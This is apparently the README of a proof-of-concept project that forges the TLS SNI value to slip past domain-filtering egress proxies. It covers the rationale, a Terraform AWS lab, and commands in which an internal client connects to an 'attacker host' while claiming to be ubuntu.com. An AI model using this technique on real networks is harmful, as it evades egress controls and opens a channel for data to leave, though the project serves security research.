# SNI Manipulation

This project demonstrates a proof-of-concept for Server Name Indication (SNI) manipulation in TLS connections
to bypass egress HTTP traffic controls that filter by domain.

## Overview

SNI manipulation is a technique to bypass HTTP traffic controls that filter by domain by forging the SNI value in the TLS handshake.

IP addresses are ephemeral and change often with cloud-hosted services, making IP address filters harder to maintain and more likely to break.
Domain filtering is easier to maintain and is less likely to break, but most connections are encrypted by default.
There are two options for filtering encrypted traffic by domain:
1. SNI inspection of the TLS handshake
2. TLS decryption and inspection of the payload

SNI inspection relies on a value supplied by the client during the TLS handshake, a variant of "trusting the client".
This opens domain filtering by SNI inspection up to spoofing attacks (SNI manipulation).

## Components

- A Squid proxy service that filters traffic by SNI.
- A client that makes outbound TLS requests with a spoofed SNI value.
- A service that accepts TLS connections and prints the SNI value from the TLS handshake.

## Getting Started

Clone the repository and build the project.

```
git clone https://github.com/DivergentCodes/sec-poc
cd sni-manipulation
make build
```

Start the service and then run the client.

```
go run client.go
go run server.go
```

## Full Example with a Terraformed AWS Environment

Deploy the environment with Terraform.

```
cd terraform
export AWS_PROFILE="<your-profile>"
terraform init
terraform apply
```

Connect to the NAT instance.

```
ssh -i ./ssh/id_ed25519 \
    -o IdentitiesOnly=yes \
    ubuntu@<NAT-instance-public-ip>
```

Connect to the private instance by using the NAT instance as a jump host.

```
ssh -v -i ./ssh/id_ed25519 \
    -o IdentitiesOnly=yes \
    -o ProxyCommand="ssh -i ./ssh/id_ed25519 -o IdentitiesOnly=yes -W %h:%p ubuntu@<NAT-instance-public-ip>" \
    ubuntu@<private-instance-private-ip>
```

## Commands

On the filtering host, watch passing SNI fields using `tcpdump`.

```sh
sudo tcpdump -i any -n -A -s0 port 443 | grep -e '\.\(com\|org\|net\|io\)'
```

On the attacker host, have the service listen on all interfaces.

```sh
sudo ./server 0.0.0.0 443
```

On the internal host, have the client connect to the attacker server,
forging the SNI value.

```sh
./client https://3.87.129.194 ubuntu.com
```


## Ethical Considerations

This example is intended for educational and research purposes only. Always obtain proper authorization before testing on any networks or systems you do not own or have explicit permission to test.

## Resources

- [RFC 6066 - Transport Layer Security (TLS) Extensions: Extension Definitions](https://tools.ietf.org/html/rfc6066#section-3)
- [IETF Draft: TLS Encrypted Client Hello](https://datatracker.ietf.org/doc/draft-ietf-tls-esni/)
- [Encrypted SNI for Firefox](https://blog.mozilla.org/security/2018/10/18/encrypted-sni-comes-to-firefox-nightly/)